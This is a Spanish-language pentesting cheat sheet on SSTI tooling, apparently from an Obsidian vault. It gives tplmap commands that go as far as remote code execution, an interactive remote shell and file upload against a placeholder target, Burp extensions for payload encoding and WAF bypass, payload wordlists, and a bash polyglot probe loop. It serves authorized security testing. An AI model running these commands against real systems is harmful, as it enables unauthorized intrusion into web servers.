---
aliases:
  - tplmap
  - SSTI Burp Extensions
  - SSTI Wordlists
tags:
  - type/tool
  - vuln/ssti
  - technique/discovery
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Server-Side Template Injection (SSTI)]]'
  - '[[Burp Suite]]'
---
# SSTI - Tooling

***

## tplmap

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/epinna/tplmap && cd tplmap && pip install -r requirements.txt` | Install tplmap | Primera vez. |
| `python tplmap.py -u "https://target/page?name=test"` | Auto-detect engine + RCE | URL con GET param controlado. |
| `python tplmap.py -u "https://target/page" -X POST -D "name=test"` | POST body injection | Form data. |
| `python tplmap.py -u "https://target/" -H "User-Agent: test"` | Header injection vector | Header reflejado en template. |
| `python tplmap.py -u "https://target/" --cookie "session=test"` | Cookie injection vector | Cookie reflejada. |
| `python tplmap.py -u "https://target/page?a=x&b=y" --param b` | Target param específico | Multiple params. |
| `python tplmap.py -u "..." --os-shell` | Shell interactiva remota | Post-RCE confirmation. |
| `python tplmap.py -u "..." --upload local.txt remote.txt` | Upload archivo via RCE | File transfer. |
| `python tplmap.py -u "..." --engine jinja2 --level 5` | Skip detection + max depth | Engine conocido + thorough. |
| `python tplmap.py -u "..." --cookie "auth=$T" --auth "user:pass"` | Authenticated SSTI | Endpoint detrás de login. |
^ssti-tool-tplmap

___

## Burp Extensions

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → BApp Store → "Backslash Powered Scanner" → Install | Active scanner heurístico para SSTI/SQLi/etc | Pasivo en historial. |
| Burp → BApp Store → "Param Miner" → Right-click → "Guess JSON parameters" | Discover hidden inputs reflejados | Pre-attack discovery. |
| Burp → BApp Store → "Active Scan++" → run scan | Checks SSTI adicionales sobre default | Bulk vuln scan. |
| Burp → BApp Store → "Hackvertor" → wrap payload `<@base64><@quote>{{7*7}}<@/quote><@/base64>` | Encoding payloads para bypass | WAF con filter naive. |
| Burp → BApp Store → "Collaborator Everywhere" → inject canary | OOB SSTI detection (template hace SSRF) | Blind SSTI. |
| Burp → BApp Store → "Reflection" → highlight reflejos | Quick screening de inputs reflejados | Pre-fuzz survey. |
| Burp → Intruder → Payloads → "Server Side Template Injection (Polyglot)" | Built-in payload set | Bulk fuzzing. |
| Burp → Logger++ → filter `request.body contains "7*7"` | Buscar request históricos con probes | Post-test review. |
^ssti-tool-burp

___

## Wordlists de Payloads

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/Server Side Template Injection/Intruder/"` | Wordlists per engine | Foundation. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/SSTI.fuzz` | Wordlist polyglot ready | Burp Intruder. |
| `cat /usr/share/seclists/Fuzzing/template-engines-special-vars.txt` | Vars contextuales SecLists | Variable enumeration. |
| `cat /usr/share/wordlists/fuzzdb/attack/server-side-include/` | fuzzdb SSI/SSTI payloads | SSI focus. |
| `for p in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '@(7*7)' '{7*7}' '*{7*7}'; do curl -s "https://target/page?q=$(jq -sRr @uri <<<$p)" \| grep -E '49\|7777777' && echo "VULN: $p"; done` | Polyglot probe rápido bash | Quick check pre-tplmap. |
| Browser → https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection | Lookup específico engine | Manual reference. |
^ssti-tool-wordlists

### One-liner polyglot detection

```bash
for p in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '@(7*7)' '{7*7}' '*{7*7}' '${{<%[%'\''"}}%\\'; do
  ENC=$(printf '%s' "$p" | jq -sRr @uri)
  RESP=$(curl -s "https://target/page?q=$ENC")
  if echo "$RESP" | grep -qE '49|7777777|49\.0'; then
    echo "VULN: $p"
  fi
done
```

***
